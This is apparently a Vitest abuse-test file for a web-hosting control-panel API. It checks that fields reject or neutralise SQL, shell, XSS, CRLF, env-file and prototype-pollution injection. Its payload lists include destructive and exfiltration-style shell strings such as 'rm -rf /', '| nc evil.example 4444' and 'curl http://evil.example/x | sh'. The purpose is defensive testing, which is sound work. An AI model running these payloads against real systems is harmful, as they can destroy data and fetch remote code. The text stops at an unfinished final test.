// Abuse tests: injection in every text field of the API (SQL, shell, header /
// CRLF, env-file, and script injection). A passing test means the attack was
// REJECTED (identifier-like fields) or stored/handled as inert data (free
// text). If one fails there is a vulnerability to fix.
import { describe, it, expect, beforeAll, afterAll, beforeEach, vi } from "vitest";

vi.mock("../db/connection.js", () => ({
  getDB: vi.fn(),
}));

import { eq, sql } from "drizzle-orm";
import * as schema from "../db/schema.js";
import { decryptSecret } from "../crypto/secrets.js";
import { setVerifierForTest } from "../auth/access.js";
import { createAbuseEnv, EMAILS, type AbuseEnv, type Who } from "./abuse-env.js";

// ---------------------------------------------------------------------------
// Payload catalogues
// ---------------------------------------------------------------------------

const SQLI = [
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  '" OR ""="',
  "1 OR 1=1",
  "1; DELETE FROM sites; --",
  "' UNION SELECT email, password_hash FROM users --",
  "x') OR ('1'='1",
  "1' AND SLEEP(5) --",
  "'; ATTACH DATABASE '/tmp/pwn.db' AS pwn; --",
  "%' OR 1=1 --",
  "\\'; DROP TABLE sites; --",
  "1/**/OR/**/1=1",
  "admin'--",
];

const SHELL = [
  "`rm -rf /`",
  "$(whoami)",
  "; cat /etc/passwd",
  "| nc evil.example 4444",
  "&& curl http://evil.example/x | sh",
  "; rm -rf /",
  "$IFS$9id",
  "${IFS}id",
  "> /etc/passwd",
  "'; id; '",
  '"; id; "',
  "\nrm -rf /",
];

const XSS = [
  "<script>alert(1)</script>",
  '"><img src=x onerror=alert(1)>',
  "</title><script>alert(1)</script>",
  "javascript:alert(1)",
  "<svg onload=alert(1)>",
];

const CRLF = [
  "x\nX-Injected: true",
  "x\r\nSet-Cookie: pwned=1",
  "x\rX-Injected: true",
  "x%0d%0aX-Injected: true",
];

const HOSTILE = [...SQLI, ...SHELL, ...XSS, ...CRLF];

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

function tableNames(env: AbuseEnv): string[] {
  return (env.db.all(sql`select name from sqlite_master where type = 'table' order by name`) as { name: string }[]).map(
    (r) => r.name,
  );
}

function counts(env: AbuseEnv) {
  const c = (t: Parameters<AbuseEnv["db"]["select"]>[0] extends never ? never : unknown) => t;
  void c;
  return {
    users: env.db.select().from(schema.users).all().length,
    sites: env.db.select().from(schema.sites).all().length,
    accounts: env.db.select().from(schema.accounts).all().length,
    databases: env.db.select().from(schema.databases).all().length,
    envVars: env.db.select().from(schema.envVars).all().length,
    plans: env.db.select().from(schema.plans).all().length,
    invitations: env.db.select().from(schema.invitations).all().length,
    alertChannels: env.db.select().from(schema.alertChannels).all().length,
    gitIntegrations: env.db.select().from(schema.gitIntegrations).all().length,
    cfConnections: env.db.select().from(schema.cfConnections).all().length,
    backups: env.db.select().from(schema.backups).all().length,
  };
}

const SENSITIVE = ["argon2", "password_hash", "passwordHash", "$argon2", EMAILS.admin, EMAILS.clientB];

describe("abuse: injection", () => {
  let env: AbuseEnv;
  let tablesAtStart: string[];
  let countsAtStart: ReturnType<typeof counts>;

  beforeAll(async () => {
    env = await createAbuseEnv();
    tablesAtStart = tableNames(env);
    countsAtStart = counts(env);
  });
  afterAll(async () => {
    await env.close();
  });
  beforeEach(() => {
    env.callAction.mockClear();
  });

  const noInjectedHeaders = (res: { headers: Record<string, unknown> }) => {
    expect(res.headers["x-injected"]).toBeUndefined();
    for (const [k, v] of Object.entries(res.headers)) {
      expect(String(v), `header ${k}`).not.toMatch(/[\r\n]/);
    }
    expect(res.headers["set-cookie"] ?? "").not.toContain("pwned");
  };

  // -------------------------------------------------------------------------
  // SQL injection in search / filter / path parameters
  // -------------------------------------------------------------------------
  describe("SQL injection in query strings and path parameters", () => {
    const urls = (p: string): string[] => {
      const e = encodeURIComponent(p);
      return [
        `/api/audit?action=${e}`,
        `/api/audit?targetType=${e}`,
        `/api/audit?actorUserId=${e}`,
        `/api/audit?since=${e}`,
        `/api/audit?until=${e}`,
        `/api/audit?page=${e}`,
        `/api/audit?limit=${e}`,
        `/api/audit?action=${e}&targetType=${e}&since=${e}&until=${e}`,
        `/api/sites/1/stats?from=${e}&to=${e}`,
        `/api/sites/1/stats?from=${e}`,
        `/api/sites/1/logs?source=${e}`,
        `/api/sites/1/logs?lines=${e}`,
        `/api/sites/1/deployments/1/log?lines=${e}`,
        `/api/alerts/log?limit=${e}`,
        `/api/removal-requests?status=${e}`,
        `/api/sites/${e}`,
        `/api/sites/${e}/env`,
        `/api/sites/${e}/stats`,
        `/api/sites/${e}/certificate`,
        `/api/accounts/${e}`,
        `/api/accounts/${e}/usage`,
        `/api/accounts/${e}/databases`,
        `/api/accounts/${e}/backups`,
        `/api/accounts/${e}/files?path=${e}`,
        `/api/accounts/${e}/files/content?path=${e}`,
        `/api/cf-connections/${e}`,
        `/api/users/${e}`,
      ];
    };

    for (const who of ["clientA", "admin"] as Who[]) {
      it.each(SQLI)(`${who}: %j in any filter never errors, leaks or alters data`, async (payload) => {
        for (const url of urls(payload)) {
          const res = await env.as(who, "GET", url);
          expect(res.statusCode, `GET ${url}: ${res.body}`).toBeLessThan(500);
          if (who === "clientA") {
            for (const s of SENSITIVE) {
              expect(res.body, `GET ${url} leaked ${s}`).not.toContain(s);
            }
          }
          expect(res.body).not.toMatch(/SQLITE_|sqlite|syntax error|better-sqlite3/i);
          noInjectedHeaders(res);
        }
        expect(tableNames(env)).toEqual(tablesAtStart);
        expect(counts(env)).toEqual(countsAtStart);
      });
    }

    it("an always-true filter does not widen a client's audit trail", async () => {
      env.db.insert(schema.auditLog).values({
        actorUserId: 1, actorKind: "user", action: "plan.create", targetType: "plan",
        targetId: "1", result: "ok", at: new Date().toISOString(),
      }).run();
      for (const p of ["' OR '1'='1", "x' OR 1=1 --", "1 OR 1=1"]) {
        for (const url of [`/api/audit?action=${encodeURIComponent(p)}`, `/api/audit?actorUserId=${encodeURIComponent(p)}`, `/api/audit?targetType=${encodeURIComponent(p)}`]) {
          const res = await env.as("clientA", "GET", url);
          expect(res.statusCode).toBeLessThan(500);
          if (res.statusCode === 200) {
            const rows = (res.json() as { data: { actorUserId: number }[] }).data;
            expect(rows.every((r) => r.actorUserId === 2), `${url} returned foreign rows`).toBe(true);
          }
        }
      }
    });

    it("repeated or bracketed query parameters never crash a listing", async () => {
      for (const url of [
        "/api/audit?action=a&action=b",
        "/api/audit?action[]=a",
        "/api/audit?action[$ne]=x",
        "/api/audit?limit=1&limit=2",
        "/api/audit?page=1&page=2&page=3",
        "/api/sites/1/stats?from=2024-01-01&from=2024-01-02",
        "/api/sites/1/logs?source=app&source=access",
        "/api/sites/1/logs?lines=5&lines=6",
        "/api/alerts/log?limit=5&limit=6",
        "/api/removal-requests?status=open&status=done",
        "/api/accounts/1/files?path=a&path=b",
      ]) {
        const res = await env.as("admin", "GET", url);
        expect(res.statusCode, `${url}: ${res.body}`).toBeLessThan(500);
      }
    });
  });

  // -------------------------------------------------------------------------
  // Identifier-like fields: every hostile value must be refused
  // -------------------------------------------------------------------------
  interface RejectSpec {
    name: string;
    who: Who;
    method: "POST" | "PATCH" | "PUT";
    url: string;
    /** Body with `p` in the field under attack. */
    body: (p: string) => unknown;
    /** Payloads made only of these characters are valid for the field and skipped. */
    valid?: RegExp;
  }

  const site = (extra: Record<string, unknown>) => ({
    accountId: 1,
    primaryDomain: "inject-ok.example.com",
    runtime: "node",
    source: "github",
    repo: "https://github.com/alice/a-repo",
    branch: "main",
    ...extra,
  });

  const rejectSpecs: RejectSpec[] = [
    { name: "account slug", who: "admin", method: "POST", url: "/api/accounts", body: (p) => ({ slug: p, planId: 1 }) },
    { name: "site primaryDomain", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ primaryDomain: p }) },
    { name: "site primaryDomain (suffix form)", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ primaryDomain: `evil.com${p}` }) },
    { name: "site primaryDomain (subdomain form)", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ primaryDomain: `${p}.example.com` }) },
    { name: "site repo", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ repo: `https://github.com/alice/${p}` }) },
    { name: "site repo (whole value)", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ repo: p }) },
    { name: "site branch", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ branch: p }), valid: /^[A-Za-z0-9._/-]+$/ },
    { name: "site installCmd", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ installCmd: `npm ci${p}` }), valid: /^[a-zA-Z0-9 _./:=@-]+$/ },
    { name: "site buildCmd", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ buildCmd: `npm run build${p}` }), valid: /^[a-zA-Z0-9 _./:=@-]+$/ },
    { name: "site startCmd", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ startCmd: `node server.js${p}` }), valid: /^[a-zA-Z0-9 _./:=@-]+$/ },
    { name: "site publicDir", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ runtime: "static", publicDir: `public${p}` }), valid: /^[a-zA-Z0-9._/-]+$/ },
    { name: "site runtimeVersion", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ runtimeVersion: `22${p}` }) },
    { name: "site runtime", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ runtime: p }) },
    { name: "site source", who: "clientA", method: "POST", url: "/api/sites", body: (p) => site({ source: p }) },
    { name: "site mode", who: "clientA", method: "PATCH", url: "/api/sites/1/mode", body: (p) => ({ mode: p }) },
    { name: "database name", who: "clientA", method: "POST", url: "/api/accounts/1/databases", body: (p) => ({ engine: "postgres", name: p, db_user: "okuser" }) },
    { name: "database user", who: "clientA", method: "POST", url: "/api/accounts/1/databases", body: (p) => ({ engine: "postgres", name: "okdbname", db_user: p }) },
    { name: "database engine", who: "clientA", method: "POST", url: "/api/accounts/1/databases", body: (p) => ({ engine: p, name: "okdbname", db_user: "okuser" }) },
    { name: "database tool", who: "clientA", method: "POST", url: "/api/accounts/1/databases/1/tool/start", body: (p) => ({ tool: p }) },
    { name: "env var key (new)", who: "clientA", method: "POST", url: "/api/sites/1/env", body: (p) => ({ key: p, value: "x" }) },
    { name: "env var key (suffix form)", who: "clientA", method: "POST", url: "/api/sites/1/env", body: (p) => ({ key: `KEY${p}`, value: "x" }) },
    { name: "env var key (update)", who: "clientA", method: "PATCH", url: "/api/sites/1/env/1", body: (p) => ({ key: p, value: "x" }) },
    { name: "user email", who: "admin", method: "POST", url: "/api/users", body: (p) => ({ email: p, password: "longenough-1", role: "client" }) },
    { name: "user email (local-part form)", who: "admin", method: "POST", url: "/api/users", body: (p) => ({ email: `a${p}@example.com`, password: "longenough-1", role: "client" }) },
    { name: "user role", who: "admin", method: "POST", url: "/api/users", body: (p) => ({ email: "role-ok@example.com", password: "longenough-1", role: p }) },
    { name: "invitation email", who: "admin", method: "POST", url: "/api/invitations", body: (p) => ({ email: `a${p}@example.com`, role: "client", accountIds: [1] }) },
    { name: "alert channel address", who: "clientA", method: "POST", url: "/api/alerts/channels", body: (p) => ({ kind: "email", address: `a${p}@example.com` }) },
    { name: "alert channel address (whole value)", who: "clientA", method: "POST", url: "/api/alerts/channels", body: (p) => ({ kind: "email", address: p }) },
    { name: "alert channel address (update)", who: "clientA", method: "PATCH", url: "/api/alerts/channels/1", body: (p) => ({ address: `a${p}@example.com` }) },
    { name: "alert rule event", who: "clientA", method: "POST", url: "/api/alerts/rules", body: (p) => ({ event: p, channelId: 1 }) },
    { name: "git integration baseUrl", who: "admin", method: "POST", url: "/api/git-integrations", body: (p) => ({ provider: "gitea", baseUrl: `https://git.example.org${p}`, credentials: "abcdefgh12" }) },
    { name: "git integration credentials", who: "admin", method: "POST", url: "/api/git-integrations", body: (p) => ({ provider: "github", credentials: p }) },
    { name: "cloudflare account id", who: "admin", method: "POST", url: "/api/cf-connections", body: (p) => ({ name: "n", cf_account_id: p, api_token: "a".repeat(30) }) },
    { name: "cloudflare api token", who: "admin", method: "POST", url: "/api/cf-connections", body: (p) => ({ name: "n", cf_account_id: "a".repeat(32), api_token: p }) },
    { name: "backup scope", who: "clientA", method: "POST", url: "/api/accounts/1/backups", body: (p) => ({ scope: p }) },
    { name: "restore target", who: "admin", method: "POST", url: "/api/accounts/1/backups/1/restore", body: (p) => ({ target: p, confirm: true }) },
    { name: "removal request review status", who: "admin", method: "PATCH", url: "/api/removal-requests/1", body: (p) => ({ status: p }) },
    { name: "account suspend id", who: "admin", method: "POST", url: "/api/accounts/1/suspend", body: () => ({}) , valid: /.*/ },
  ];

  describe.each(rejectSpecs.filter((s) => s.valid?.source !== /.*/.source))("field: $name", (spec) => {
    const payloads = HOSTILE.filter((p) => !spec.valid || !spec.valid.test(p));

    it.each(payloads)("rejects %j and runs nothing", async (p) => {
      const before = counts(env);
      const res = await env.as(spec.who, spec.method, spec.url, spec.body(p));
      expect(res.statusCode, `${spec.method} ${spec.url} ${JSON.stringify(spec.body(p))} -> ${res.body}`).toBeGreaterThanOrEqual(400);
      expect(res.statusCode).toBeLessThan(500);
      expect(env.callAction, "the agent must not see a hostile value").not.toHaveBeenCalled();
      expect(counts(env)).toEqual(before);
      noInjectedHeaders(res);
    });
  });

  it("the login password field is inert to SQL injection", async () => {
    setVerifierForTest(async () => ({ email: EMAILS.clientA, sub: EMAILS.clientA }));
    for (const password of SQLI) {
      const res = await env.app.inject({
        method: "POST",
        url: "/api/auth/login",
        headers: { "cf-access-jwt-assertion": "token" },
        payload: { password },
      });
      expect(res.statusCode, password).toBe(401);
      expect(res.headers["set-cookie"]).toBeUndefined();
    }
    // Non-string passwords (NoSQL-style operators, arrays, numbers) too.
    for (const password of [{ $ne: "" }, { $gt: "" }, ["a"], 0, true, null]) {
      const res = await env.app.inject({
        method: "POST",
        url: "/api/auth/login",
        headers: { "cf-access-jwt-assertion": "token" },
        payload: { password },
      });
      expect(res.statusCode, JSON.stringify(password)).toBeGreaterThanOrEqual(400);
      expect(res.statusCode).toBeLessThan(500);
      expect(res.headers["set-cookie"]).toBeUndefined();
    }
  });

  // -------------------------------------------------------------------------
  // Specific attacks named in the roadmap
  // -------------------------------------------------------------------------
  describe("domain injection", () => {
    it.each([
      "evil.com; rm -rf /",
      "evil.com\nX-Injected: true",
      "evil.com\r\nX-Injected: true",
      "evil.com\r\n\r\n<script>alert(1)</script>",
      'evil.com" { respond "pwned" }',
      "evil.com }\n:80 {\n respond pwned\n}",
      "evil.com`id`",
      "evil.com$(id)",
      "evil.com && curl evil.example",
    ])("site creation refuses the domain %j", async (primaryDomain) => {
      const res = await env.as("clientA", "POST", "/api/sites", site({ primaryDomain }));
      expect(res.statusCode, res.body).toBe(400);
      expect(env.callAction).not.toHaveBeenCalled();
      noInjectedHeaders(res);
    });
  });

  describe("environment variable injection", () => {
    const bodyOf = () => env.db.select().from(schema.envVars).all();

    it.each([
      "KEY=val\nINJECTED=true",
      "KEY\nINJECTED=true",
      "KEY=val",
      "KEY\r\nINJECTED=true",
      "KEY\0",
      "KEY VAL",
      "KEY;id",
      "KEY$(id)",
      "KEY`id`",
      "1KEY",
      "KEY-NAME",
      "__proto__",
      "",
    ])("key %j is refused on create and update", async (key) => {
      const before = bodyOf().length;
      const create = await env.as("clientA", "POST", "/api/sites/1/env", { key, value: "x" });
      expect(create.statusCode).toBe(400);
      const update = await env.as("clientA", "PATCH", "/api/sites/1/env/1", { key, value: "x" });
      expect(update.statusCode).toBe(400);
      expect(bodyOf().length).toBe(before);
    });

    it.each([
      "val\nINJECTED=true",
      "val\r\nINJECTED=true",
      "val\rINJECTED=true",
      "val\0",
      "x".repeat(8193),
    ])("value %j is refused on create and update", async (value) => {
      const create = await env.as("clientA", "POST", "/api/sites/1/env", { key: "SAFE_NEW", value });
      expect(create.statusCode).toBe(400);
      const update = await env.as("clientA", "PATCH", "/api/sites/1/env/1", { value });
      expect(update.statusCode).toBe(400);
      expect(env.db.select().from(schema.envVars).where(eq(schema.envVars.key, "SAFE_NEW")).all()).toHaveLength(0);
    });

    it.each([{ a: 1 }, ["x"], 5, true])("a non-string value %j is a 400, not a crash", async (value) => {
      for (const [method, url] of [["POST", "/api/sites/1/env"], ["PATCH", "/api/sites/1/env/1"]] as const) {
        const res = await env.as("clientA", method, url, { key: "TYPE_CONF", value });
        expect(res.statusCode, `${method} ${url}`).toBe(400);
      }
    });

    it("shell syntax and SQL in a VALUE is stored verbatim as inert data", async () => {
      for (const [i, value] of [...SQLI, ...SHELL.filter((s) => !s.includes("\n")), ...XSS].entries()) {
        const key = `DATA_${i}`;
        const res = await env.as("clientA", "POST", "/api/sites/1/env", { key, value });
        expect(res.statusCode, `${value}: ${res.body}`).toBe(201);
        expect(res.body, "plaintext must not be echoed back").not.toContain(value);
        const row = env.db.select().from(schema.envVars).where(eq(schema.envVars.key, key)).get();
        expect(decryptSecret(row!.valueEnc)).toBe(value);
        await env.as("clientA", "DELETE", `/api/sites/1/env/${row!.id}`);
      }
      expect(tableNames(env)).toEqual(tablesAtStart);
    });

    it("after all the attacks the site still has exactly its original variables", () => {
      const keys = env.db.select().from(schema.envVars).where(eq(schema.envVars.siteId, 1)).all().map((r) => r.key);
      expect(keys).toEqual(["A_KEY"]);
    });
  });

  // -------------------------------------------------------------------------
  // Free-text fields: accepted as inert data, never as markup or commands
  // -------------------------------------------------------------------------
  describe("free text is stored as data and served as JSON", () => {
    const reasonRows = () => env.db.select().from(schema.removalRequests).where(eq(schema.removalRequests.siteId, 1)).all();

    it.each([...SQLI, ...SHELL.filter((s) => !s.includes("\n")), ...XSS])(
      "removal reason %j is stored verbatim and the tables survive",
      async (reason) => {
        env.db.update(schema.removalRequests).set({ status: "done" }).where(eq(schema.removalRequests.siteId, 1)).run();
        const res = await env.as("clientA", "POST", "/api/sites/1/removal-request", { reason });
        expect(res.statusCode, res.body).toBe(201);
        expect(reasonRows().at(-1)!.reason).toBe(reason.trim());
        expect(res.headers["content-type"]).toMatch(/^application\/json/);
        expect(env.callAction).not.toHaveBeenCalled();
        expect(tableNames(env)).toEqual(tablesAtStart);
      },
    );

    it("a script in the removal reason is delivered as JSON with nosniff, never as HTML", async () => {
      env.db.update(schema.removalRequests).set({ status: "done" }).where(eq(schema.removalRequests.siteId, 1)).run();
      await env.as("clientA", "POST", "/api/sites/1/removal-request", { reason: XSS[0] });
      const res = await env.as("admin", "GET", "/api/removal-requests");
      expect(res.statusCode).toBe(200);
      expect(res.headers["content-type"]).toMatch(/^application\/json/);
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
      expect(res.body).toContain("<script>alert(1)</script>"); // inert inside JSON
      expect(() => JSON.parse(res.body)).not.toThrow();
    });

    it.each(XSS)("a site notice with %j is stored as plain data and handed to the agent unmodified (the agent escapes it)", async (payload) => {
      const res = await env.as("clientA", "PATCH", "/api/sites/1/mode", {
        mode: "maintenance",
        noticeTitle: payload,
        noticeMessage: payload,
      });
      expect(res.statusCode, res.body).toBe(200);
      expect(res.headers["content-type"]).toMatch(/^application\/json/);
      const sync = env.callAction.mock.calls.find(([a]) => a === "caddy.sync");
      expect(sync).toBeTruthy();
      expect(JSON.stringify(sync![1])).toContain("notice_title");
      await env.as("clientA", "PATCH", "/api/sites/1/mode", { mode: "online" });
    });

    it.each([
      ["noticeTitle", "t".repeat(201)],
      ["noticeMessage", "m".repeat(2001)],
      ["noticeEta", "e".repeat(101)],
      ["noticeTitle", "bell\x07char"],
      ["noticeMessage", "nul\0byte"],
      ["noticeTitle", { a: 1 }],
      ["noticeMessage", ["x"]],
      ["noticeEta", 12345],
    ])("site notice %s with an oversized or malformed value is refused", async (field, value) => {
      const res = await env.as("clientA", "PATCH", "/api/sites/1/mode", { mode: "maintenance", [field]: value });
      expect(res.statusCode, `${field}: ${res.body}`).toBe(400);
    });

    it("site responses never carry the (encrypted) webhook secret", async () => {
      for (const res of [
        await env.as("clientA", "PATCH", "/api/sites/1/mode", { mode: "online" }),
        await env.as("clientA", "GET", "/api/sites/1"),
        await env.as("clientA", "GET", "/api/sites"),
      ]) {
        expect(res.body).not.toMatch(/webhookSecretEnc|webhook_secret/);
      }
    });

    it.each(XSS)("names meant to be displayed (%j) are plain data in plan listings", async (name) => {
      const created = await env.as("admin", "POST", "/api/plans", {
        name: `${name}-${Math.random().toString(36).slice(2, 8)}`.slice(0, 50),
        cpuMillis: 500, memoryMb: 256, diskMb: 1000, maxSites: 1, maxDatabases: 1,
      });
      expect(created.statusCode, created.body).toBe(201);
      const list = await env.as("admin", "GET", "/api/plans");
      expect(list.headers["content-type"]).toMatch(/^application\/json/);
      expect(list.headers["x-content-type-options"]).toBe("nosniff");
      await env.as("admin", "DELETE", `/api/plans/${created.json().id}`);
    });
  });

  // -------------------------------------------------------------------------
  // Responses: headers, reflected input and error leakage
  // -------------------------------------------------------------------------
  describe("response headers and error bodies", () => {
    const expectHardenedHeaders = (res: { headers: Record<string, unknown> }) => {
      expect(res.headers["x-content-type-options"]).toBe("nosniff");
      expect(res.headers["x-frame-options"]).toBe("DENY");
      expect(res.headers["referrer-policy"]).toBe("same-origin");
      const csp = String(res.headers["content-security-policy"]);
      expect(csp).toContain("default-src 'self'");
      expect(csp).not.toContain("unsafe-inline");
      expect(csp).not.toContain("unsafe-eval");
    };

    it("success, client-error, auth-error, not-found and malformed-body responses all carry the hardened headers", async () => {
      expectHardenedHeaders(await env.as("clientA", "GET", "/api/sites/1"));
      expectHardenedHeaders(await env.as("clientA", "GET", "/api/sites/2"));
      expectHardenedHeaders(await env.as("clientA", "GET", "/api/sites/abc"));
      expectHardenedHeaders(await env.app.inject({ method: "GET", url: "/api/sites" }));
      expectHardenedHeaders(await env.app.inject({ method: "GET", url: "/api/does-not-exist" }));
      expectHardenedHeaders(
        await env.app.inject({
          method: "POST", url: "/api/auth/login", headers: { "content-type": "application/json" }, payload: "{",
        }),
      );
    });

    it("a script in the URL is not reflected by the 404 page", async () => {
      for (const url of [
        "/<script>alert(1)</script>",
        "/api/<script>alert(1)</script>",
        "/api/sites/%3Cscript%3Ealert(1)%3C/script%3E/env",
        "/hooks/github/%3Cscript%3E",
      ]) {
        const res = await env.app.inject({ method: "GET", url });
        expect(res.headers["content-type"], url).toMatch(/^application\/json/);
        expect(res.body, url).not.toContain("<script>");
        expect(res.body, url).not.toContain("alert(1)");
      }
    });

    it("malformed JSON gets a generic 400 that does not echo the parser message or the body", async () => {
      const res = await env.app.inject({
        method: "POST",
        url: "/api/auth/login",
        headers: { "content-type": "application/json" },
        payload: '{"password": "<script>alert(1)</script>"',
      });
      expect(res.statusCode).toBe(400);
      expect(res.body).not.toMatch(/Unexpected|JSON|position|token|script|FST_ERR/i);
      expect(res.json().error.code).toBeTruthy();
    });

    it("an unsupported content type gets a generic 415", async () => {
      const res = await env.as("clientA", "POST", "/api/sites/1/env", undefined, { "content-type": "text/html" });
      expect([400, 415]).toContain(res.statusCode);
      expect(res.body).not.toMatch(/FST_ERR|text\/html/);
    });

    it("an oversized request body gets a generic 413", async () => {
      const res = await env.as("clientA", "POST", "/api/sites/1/removal-request", { reason: "x".repeat(2 * 1024 * 1024) });
      expect(res.statusCode).toBe(413);
      expect(res.body).not.toMatch(/FST_ERR|bodyLimit|Request body is too large/i);
    });

    it("an unexpected exception becomes a generic 500 without internals", async () => {
      env.callAction.mockRejectedValueOnce(
        new Error("connect ECONNREFUSED /run/forja/agent.sock at /home/forja/src/agent/client.ts:42 SECRET-DETAIL"),
      );
      const res = await env.as("clientA", "GET", "/api/accounts/1/files?path=.");
      expect(res.statusCode).toBe(500);
      expect(res.body).not.toMatch(/ECONNREFUSED|agent\.sock|client\.ts|SECRET-DETAIL|at \w+ \(|stack/i);
      expect(res.json()).toEqual({ error: { code: "INTERNAL_ERROR", message: "Internal server error" } });
      expectHardenedHeaders(res);
    });

    it("no CORS headers are ever granted to a foreign origin", async () => {
      for (const res of [
        await env.as("clientA", "GET", "/api/sites", undefined, { origin: "https://evil.example" }),
        await env.app.inject({ method: "OPTIONS", url: "/api/sites", headers: { origin: "https://evil.example", "access-control-request-method": "DELETE" } }),
      ]) {
        expect(res.headers["access-control-allow-origin"]).toBeUndefined();
        expect(res.headers["access-control-allow-credentials"]).toBeUndefined();
      }
    });

    it("attacker-controlled request headers are never reflected in the response", async () => {
      const res = await env.as("clientA", "GET", "/api/sites", undefined, {
        host: "evil.example",
        "x-forwarded-host": "evil.example",
        "x-forwarded-for": "6.6.6.6",
        referer: "https://evil.example/<script>",
        "user-agent": "<script>alert(1)</script>",
      });
      expect(res.statusCode).toBeLessThan(500);
      for (const [k, v] of Object.entries(res.headers)) {
        expect(String(v), `header ${k}`).not.toContain("evil.example");
        expect(String(v), `header ${k}`).not.toContain("<script>");
      }
      expect(res.body).not.toContain("evil.example");
    });

    it("the session cookie is HttpOnly, SameSite=Strict and not readable by script", async () => {
      setVerifierForTest(async () => ({ email: EMAILS.clientA, sub: EMAILS.clientA }));
      const res = await env.app.inject({
        method: "POST", url: "/api/auth/login", headers: { "cf-access-jwt-assertion": "token" },
        payload: { password: "clientApass-1" },
      });
      const cookie = String(res.headers["set-cookie"]);
      expect(cookie).toMatch(/HttpOnly/i);
      expect(cookie).toMatch(/SameSite=Strict/i);
    });
  });

  // -------------------------------------------------------------------------
  // Type confusion fuzz: wrong JSON shapes must never produce a 5xx
  // -------------------------------------------------------------------------
  describe("malformed JSON shapes never crash a handler", () => {
    const shapes: { name: string; payload: string }[] = [
      { name: "null", payload: "null" },
      { name: "array", payload: "[]" },
      { name: "string", payload: '"text"' },
      { name: "number", payload: "123" },
      { name: "boolean", payload: "true" },
      { name: "empty object", payload: "{}" },
      { name: "all fields null", payload: '{"slug":null,"planId":null,"accountId":null,"primaryDomain":null,"repo":null,"key":null,"value":null,"name":null,"email":null,"password":null,"role":null,"mode":null,"status":null,"reason":null,"kind":null,"address":null,"event":null,"channelId":null,"path":null,"content":null,"scope":null,"target":null,"engine":null,"db_user":null,"tool":null}' },
      { name: "all fields objects", payload: '{"slug":{},"planId":{},"accountId":{},"primaryDomain":{},"repo":{},"key":{},"value":{},"name":{},"email":{},"password":{},"role":{},"mode":{},"status":{},"reason":{},"kind":{},"address":{},"event":{},"channelId":{},"path":{},"content":{},"scope":{},"target":{},"engine":{},"db_user":{},"tool":{}}' },
      { name: "all fields arrays", payload: '{"slug":[1],"planId":[1],"accountId":[1],"primaryDomain":["a.com"],"repo":["x"],"key":["K"],"value":["v"],"name":["n"],"email":["a@b.co"],"password":["pppppppp"],"role":["admin"],"mode":["online"],"status":["done"],"reason":["r"],"kind":["email"],"address":["a@b.co"],"event":["site_down"],"channelId":[1],"path":["a"],"content":["c"],"scope":["all"],"target":["all"],"engine":["postgres"],"db_user":["u"],"tool":["adminer"]}' },
      { name: "all fields huge numbers", payload: '{"planId":1e999,"accountId":-1,"channelId":9007199254740993,"cpuMillis":1e999,"memoryMb":-1,"maxSites":0.5}' },
      { name: "prototype pollution keys", payload: '{"__proto__":{"role":"admin","polluted":true},"constructor":{"prototype":{"polluted":true}}}' },
    ];

    const endpoints: { who: Who; method: "POST" | "PATCH" | "PUT" | "DELETE"; url: string }[] = [
      { who: "admin", method: "POST", url: "/api/accounts" },
      { who: "admin", method: "POST", url: "/api/users" },
      { who: "admin", method: "PATCH", url: "/api/users/2" },
      { who: "admin", method: "POST", url: "/api/users/2/accounts" },
      { who: "admin", method: "POST", url: "/api/invitations" },
      { who: "admin", method: "POST", url: "/api/plans" },
      { who: "admin", method: "PUT", url: "/api/plans/1" },
      { who: "admin", method: "POST", url: "/api/cf-connections" },
      { who: "admin", method: "POST", url: "/api/cf-connections/1/accounts" },
      { who: "admin", method: "POST", url: "/api/git-integrations" },
      { who: "admin", method: "PATCH", url: "/api/removal-requests/1" },
      { who: "admin", method: "POST", url: "/api/accounts/1/backups/1/restore" },
      { who: "clientA", method: "POST", url: "/api/sites" },
      { who: "clientA", method: "PATCH", url: "/api/sites/1/mode" },
      { who: "clientA", method: "POST", url: "/api/sites/1/deploy" },
      { who: "clientA", method: "POST", url: "/api/sites/1/env" },
      { who: "clientA", method: "PATCH", url: "/api/sites/1/env/1" },
      { who: "clientA", method: "POST", url: "/api/sites/1/removal-request" },
      { who: "clientA", method: "POST", url: "/api/sites/1/certificate" },
      { who: "clientA", method: "POST", url: "/api/accounts/1/databases" },
      { who: "clientA", method: "PATCH", url: "/api/accounts/1/databases/1/password" },
      { who: "clientA", method: "POST", url: "/api/accounts/1/databases/1/tool/start" },
      { who: "clientA", method: "POST", url: "/api/accounts/1/backups" },
      { who: "clientA", method: "POST", url: "/api/accounts/1/backups/export" },
      { who: "clientA", method: "PUT", url: "/api/accounts/1/files/content" },
      { who: "clientA", method: "POST", url: "/api/accounts/1/files/mkdir" },
      { who: "clientA", method: "POST", url: "/api/accounts/1/files/upload" },
      { who: "clientA", method: "POST", url: "/api/alerts/channels" },
      { who: "clientA", method: "PATCH", url: "/api/alerts/channels/1" },
      { who: "clientA", method: "POST", url: "/api/alerts/rules" },
    ];

    it.each(shapes)("$name body on every write endpoint", async ({ payload }) => {
      for (const ep of endpoints) {
        const a = env.auth[ep.who];
        const res = await env.app.inject({
          method: ep.method,
          url: ep.url,
          headers: { cookie: a.cookie, "x-csrf-token": a.csrf, "content-type": "application/json" },
          payload,
        });
        expect(res.statusCode, `${ep.method} ${ep.url} ${payload.slice(0, 40)} -> ${res.body}`).toBeLessThan(500);
      }
      expect(({} as Record<string, unknown>).polluted).toBeUndefined();
      expect(tableNames(env)).toEqual(tablesAtStart);
    });

    it("write endpoints survive having no body at all", async () => {
      for (const ep of endpoints) {
        const res = await env.as(ep.who, ep.method, ep.url);
        expect(res.statusCode, `${ep.method} ${ep.url} -> ${res.body}`).toBeLessThan(500);
      }
    });
  });

  it("nothing above altered the schema or removed any row it should not have", () => {
